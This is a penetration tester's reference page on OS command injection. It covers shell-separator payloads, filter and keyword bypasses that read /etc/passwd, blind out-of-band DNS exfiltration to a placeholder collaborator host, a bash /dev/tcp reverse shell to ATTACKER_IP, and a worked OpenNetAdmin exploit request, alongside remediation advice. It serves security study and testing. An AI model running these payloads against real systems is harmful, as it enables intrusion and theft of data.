---
type: technique
title: OS Command Injection
lang: en
status: active
wstg: ["WSTG-INPV-12"]
owasp_top10: ["A03:2021"]
owasp_api: []
asvs: ["V1.2.5"]
cwe: ["CWE-78"]
attack: ["T1190"]
cvss: ""
sources: [web-200-oswa, payloadsallthethings, hacktricks]
updated: 2026-09-17
---

# OS Command Injection

**TL;DR** — When user input is passed into an OS shell/command call, shell metacharacters
let an attacker append their own commands and run them on the host → RCE.

> Framework: **A03:2021 – Injection**, `CWE-78`, ATT&CK `T1190`. WSTG + ASVS IDs in frontmatter (WSTG 4.2 / ASVS 5.0, verified).
> ⚠️ **AV note:** payloads here are deliberately **defanged** (placeholders, non-functional
> web shell) so Defender/OneDrive don't quarantine this vault file. Reconstruct live
> payloads yourself at test time.

## Where it applies

Features that shell out: network tools (ping/traceroute/nslookup), file conversion/
compression, backup/admin utilities, image/PDF processing, anything that builds a command
string from input. Often reached via non-obvious POST data, not just visible fields.

## How it works

The app runs something like `system("ping -c1 " + input)`. Shell metacharacters break out
of the intended command:

```
; id            # command separator (run a second command)
| whoami        # pipe output into the next command
&& id   || id   # run on success / on failure
`id`   $(id)    # command substitution (inline)
%0a id          # newline (URL-encoded) as a separator
```

## Detection

Inject a separator + a benign, unambiguous command and look for its output. When output
isn't returned (**blind**), use an out-of-band or timing oracle:

```
; sleep 5                       # response delay confirms execution
; nslookup me.<your-collab>     # OOB DNS callback confirms (and exfiltrates)
```

## Bypassing common protections

- **Input normalisation / clean-payload need:** encode separators (`%0a`, `%26`), fit the
  surrounding quoting.
- **Blocklisted strings / spaces:** `${IFS}` or `<` for spaces; break keywords with quotes
  or concatenation; wildcards for paths:

  ```
  ;cat</etc/passwd
  ;{cat,/etc/passwd}
  ;w'h'o'a'mi         ;  /???/??t /etc/pa??wd
  ```
- **Blind OS injection:** chain time/OOB oracles above to enumerate before escalating.

## Getting a shell

Upgrade command execution to interactive access — full one-liner set + PTY upgrade on
[[reverse-shells]]. The course covers [[netcat]] / Python / Node.js / PHP / Perl one-liners;
the canonical bash form (placeholders — fill in at test time):

```
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```

**Writing a web shell** (module 13.3.8) — *defanged on purpose*: a minimal one-liner that
reads a request parameter and passes it to a command-exec function, echoing the output.
Keep the working version off this OneDrive-synced vault:

```php
<?php /* cmd web shell: $_REQUEST['c'] -> command-exec function -> echo output (reconstruct) */ ?>
```

### Argument injection

Even with shell metacharacters filtered, controlling an *argument* to a command can be
abused — injecting flags the program acts on: `-o`/`--output` to write files, `@file` to
read them, or option-rich binaries (`curl`, `tar`, `ffmpeg`, `git`) coerced into requests or
file access. Reproduce and iterate requests with [[curl]].

## Payload library

Inert; confirm exec with `id`/`whoami`, blind with `sleep`. Weapons defanged
(OneDrive/Defender). Fuller set: [[payloadsallthethings|PaTT]] + [[hacktricks]].

**Separators** (terminate the running command / append yours):

```bash
; id            # sequential
| id            # pipe output into the next command
|| id           # run if the previous command FAILED
&& id           # run if the previous command SUCCEEDED
& id            # background the first (Windows: shows only the 2nd output)
`id`   $(id)    # inline command substitution (input used inside a command)
%0a id          # URL-encoded newline — works when ; | & are filtered
```

**Space bypass** (spaces filtered):

```bash
cat${IFS}/etc/passwd            # ${IFS} = internal field separator
{cat,/etc/passwd}               # brace expansion — comma acts as separator
cat</etc/passwd                 # < input redirection instead of a space
X=$'cat\x20/etc/passwd';$X      # ANSI-C quoting builds the space, then run
;ls%09-al                       # %09 TAB as separator
```

**Keyword / char-filter bypass** (command name blocklisted):

```bash
w'h'o'am'i     wh""oami     wh\o\am\i       # quotes / backslashes split the word
who$@ami       who$()ami                     # empty expansions
/???/??t /???/p??s??                         # wildcards → /bin/cat /etc/passwd
cat ${HOME:0:1}etc${HOME:0:1}passwd          # build "/" from an env var (no literal slash)
cat `xxd -r -p <<< 2f6574632f706173737764`   # hex → /etc/passwd
```

**Blind (no output)** — time & OOB oracles:

```bash
; sleep 5                              # a delay confirms execution
; ping -c1 me.<your-collab>            # OOB via ICMP/DNS callback
; nslookup $(whoami).<your-collab>     # exfil a value through a DNS label
```

**Windows:**

```bat
& whoami            & type C:\Windows\win.ini
ping %CommonProgramFiles:~10,-18%127.0.0.1   :: %VAR:~a,b% substring yields a space
powershell c:\*\*32\c*c.e?e                   :: wildcards + caret ^ escaping
```

**Polyglot** (fires across quoting contexts):

```text
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
```

## Worked example — OpenNetAdmin (ONA)

From [[web-200-oswa]] (black-box, `http://opennetadmin/ona/`, default `admin:admin`).
Exploring *Reports → View Report* surfaces network features including **Ping**. The initial
ping request shows no obvious parameter, but forwarding it in [[burp-suite|Burp]] reveals a
`xajax` POST whose args carry the target IP. Injecting `;id` into that argument:

```
xajax=window_submit&xajaxr=<ts>&xajaxargs[]=tooltips&xajaxargs[]=ip=>172.24.0.2;id&xajaxargs[]=ping
```

returns the output of `id` — the app runs the value via PHP `passthru()`, so we have command
injection → RCE and full host compromise.

## Confirming impact

Return of `id`/`whoami` proves RCE. Then (in scope) establish a shell and note privilege.
Severity **Critical**.

## Remediation

- Don't call a shell with user input — use language/library APIs (e.g. parameterised exec
  that takes an argv array, not a command string) so metacharacters aren't interpreted.
- If a command is unavoidable, **allowlist** exact values and reject all shell metacharacters;
  never build the command by string concatenation.
- Least-privilege the app process; network egress controls blunt reverse shells / OOB.

## Quick checklist

- [ ] Any feature that shells out (ping/dns/convert/backup/pdf/img) or a hidden POST arg?
- [ ] Separator + `id`; no output → `sleep`/OOB (Collaborator) for blind.
- [ ] Metachars filtered → **argument injection** (`-o`, `@file`); spaces → `${IFS}`/`{a,b}`; keyword → quotes/wildcards/`${HOME:0:1}`.
- [ ] Confirm `id`/`whoami`; then a reverse shell (defanged one-liner) → [[netcat]]. Note privilege.

## See also

[[sql-injection]] · [[ssti]] · [[directory-traversal]] · [[burp-suite]] · [[web-app-assessment]]

*Sources: [[web-200-oswa]] module 13 (OpenNetAdmin case study); [[payloadsallthethings]] + [[hacktricks]] (separator/space/keyword/slash-free bypasses, blind OOB, Windows, polyglot).*
